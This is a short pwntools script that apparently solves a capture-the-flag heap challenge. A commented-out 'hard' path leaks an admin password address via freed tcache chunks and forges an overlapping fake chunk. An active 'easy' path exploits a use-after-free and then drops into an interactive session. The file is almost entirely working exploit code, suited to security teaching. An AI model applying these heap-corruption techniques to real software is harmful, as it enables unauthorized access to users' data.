from pwn import *

r = process('./chal')
# r = remote('edu-ctf.zoolab.org', 10008)

context.arch = 'amd64'

def add_user(idx, user_name, user_passwd):
    r.sendafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendafter(b'username\n> ', user_name)
    r.sendafter(b'password\n> ', user_passwd)

def edit_data(idx, note_size, message):
    r.sendafter(b"> ", b"2")
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendlineafter(b'size\n> ', str(note_size))
    r.send(message)

def del_user(idx):
    r.sendafter(b"> ", b"3")
    r.sendlineafter(b'index\n> ', str(idx))

def show_user():
    r.sendafter(b"> ", b"4")


'''------------------
Hard solution
------------------'''
# '''leak admin password address'''
# edit_data(0, 0x8, b'a')
# add_user(1, b'a'*8, b'aaaa')
# edit_data(1, 0x20, b'a')
# add_user(2, b'b'*8, b'bbbb')
# del_user(2)
# del_user(1)
# show_user()
# r.recvuntil(b'[1] ')
# r.recvuntil(b'data: ')
# admin_pass_addr = u64(r.recv(6).ljust(8, b'\x00')) - 0xa0
# print(hex(admin_pass_addr))

# '''Get the memory back from tcache'''
# add_user(1, b'a'*8, b'aaaa')
# edit_data(1, 0x20, b'a')

# '''Construct fake chunk and edit 0 to overlap'''
# fake_chunk = flat(
#     b'a'*8, b'a'*8,
#     b'a'*8, 0x31,
#     b'a'*8, b'a'*8,
#     b'a'*8, b'a'*8,
#     admin_pass_addr, 
# )
# edit_data(0, 0x48, fake_chunk)
# show_user()
# r.close()

'''------------------
Easy solution
------------------'''
r = process('./chal')

add_user(1, b'a'*8, b'aaaa')
del_user(0)
edit_data(1, 0x20, b'b'*16)
show_user()

r.interactive()